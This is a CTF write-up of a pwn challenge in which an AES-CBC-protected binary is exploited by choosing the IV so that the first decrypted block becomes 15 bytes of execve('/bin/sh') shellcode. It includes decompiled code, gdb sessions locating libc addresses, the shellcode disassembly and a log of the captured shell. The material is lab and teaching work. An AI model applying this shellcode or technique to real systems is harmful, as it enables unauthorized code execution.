## pwn / c0py_pr073c710n (200+11p, 26 solves)

>software piracy is a crime!
>don’t steal our hard work.
>
>nc 104.154.90.175 54509 
>[download](cat_flag.exe)
>
>hint: 2.19-18+deb8u4

cat_flag.exe is x86-64 elf binary with some code inside (marked as protected() routine) encrypted using aes-128-cbc. mechanism is quite simple: binary asks for license key, then decrypts and executes protected() routine.

```c
int main()
{
  // ...
  char licensekey[48]; // [sp+0h] [bp-60h]@  
  // ...
  
  printf("license key: ", 0ll);
  strcpy(&licensekey[17], 'guyoigpbngjt9rb8');
  fgets(licensekey, 33, stdin);
  err_load_crypto_strings(licensekey, 33ll);
  openssl_add_all_algorithms_noconf();
  openssl_config(0ll);
  // {...}
  if ( mprotect(page_addr, page_size, 7) == -1 )
  {
    result = -1;
  }
  else
  {
    puts("decrypting protected code...");
    // ... (evaluating encrypted code offset)
    decrypted_len = decrypt(&protected, protectedlen, licensekey, &licensekey[17], &protected);
    // ... (noping rest of payload)
    if ( mprotect(page_addr, page_size, 5) == -1 )
    {
      result = -1;
    }
    else
    {
      puts("finished decryption!");
      puts("starting protected code...");
      protected();
      puts("bye!");
      result = 0;
    }
  }
  return result;
}
```

license key is 33-chars string, which is interpreted as 16-bytes aes key and 16-bytes iv with one not-important char in the middle. if we look [how cbc mode works](https://en.wikipedia.org/wiki/block_cipher_mode_of_operation#cipher_block_chaining_.28cbc.29), we can notice one interesting thing:

first decrypted block is just xor'ed with iv, which means that if we have control over iv, we can "decrypt" this block to everything we want. just get some (random) key, "decrypt" ciphertext using it and xor the result with code you want to execute.

unfortunately, using this method, we can write only one block, which means that our shellcode can be only 16 bytes length. 
binary doesn't have any reference to system() inside, no code which could be helpful in spawning shell. it was difficult to place *"/bin/sh"* and *execve()* syscall in 16 bytes. fortunately, libc contains string *"/bin/sh"* inside.

    (gdb) set environment ld_preload=libc2.19-18+deb8u4/libc-2.19.so libc2.19-18+deb8u4/ld-2.19.so
    ...
    (gdb) find &puts, -999999, "/bin/sh"
    0x7ffff7b8f6e8

i've also noticed that *puts()* leaves address in rcx register, which points to the part of *write()* routine from libc. 
with this address, we can easily evaluate *"/bin/sh"* position. call to *puts()* can also be found just before *protected()* execution.

    (gdb) x/i $rip
    => 0x400c06 <main+33>:  callq  0x400900 <puts@plt>
    (gdb) x/d $rcx
    0x0:    cannot access memory at address 0x0
    (gdb) ni
    welcome to cat_flag.exe v0.3
    0x0000000000400c0b in main ()
    (gdb) x/d $rcx
    0x7ffff7b07e20 <write+16>:  -268354232

finally, this 0xf-bytes shellcode was created:

    0:   31 f6                xor    esi,esi            /* argv null */
    2:   48 8d b9 b8 78 08 00 lea    rdi, [rcx+0x878b8] /* cmd "/bin/sh" */
    9:   b0 3b                mov    al,0x3b            /* execve */ 
    b:   31 d2                xor    edx,edx            /* env null */
    d:   0f 05                syscall                   /* fire! */

...and using this [exploit](exploit.py) we successfully got access to shell and were able to read the flag.

ps.: shell had also small trap: some commands were modified and didn't produce any output (e.g. ls wasn't working)

    [+] opening connection to 104.154.90.175 on port 54509: done
    [*] switching to interactive mode
    $ ls
    $ pwd
    /home/ctf
    $ find
    .
    ./ynetd
    ./.bashrc
    ./.bash_logout
    ./flag.txt
    ./cat_flag.exe
    ./.profile
    $ cat /home/ctf/flag.txt
    hxp{the unauthorized reproduction or distribution of this copyrighted work is illegal. criminal copyright infringement, including infringement without monetary gain, is investigated by the fbi and is punishable by up to five years in federal prison and a fine of $250,000.}$  

